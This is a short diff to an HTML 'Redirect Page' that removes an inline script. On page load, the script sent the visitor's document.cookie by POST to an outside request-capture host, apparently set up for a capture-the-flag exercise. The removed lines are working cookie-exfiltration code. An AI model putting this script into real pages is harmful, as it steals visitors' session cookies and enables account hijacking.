@@ -1,25 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirect Page</title>
 </head>
 <body>
-    <script>
-        window.addEventListener('DOMContentLoaded', (event) => {
-            const headers = new Headers();
-            headers.append("Content-Type", "application/json");
     
-            const body = JSON.stringify({cookie: document.cookie});
-    
-            const options = {
-                method: "POST",
-                headers,
-                mode: "cors",
-                body: body,
-            };
-    
-            fetch("https://ctfosu.free.beeceptor.com", options);
-        });
-    </script>    
 </body>
 </html>
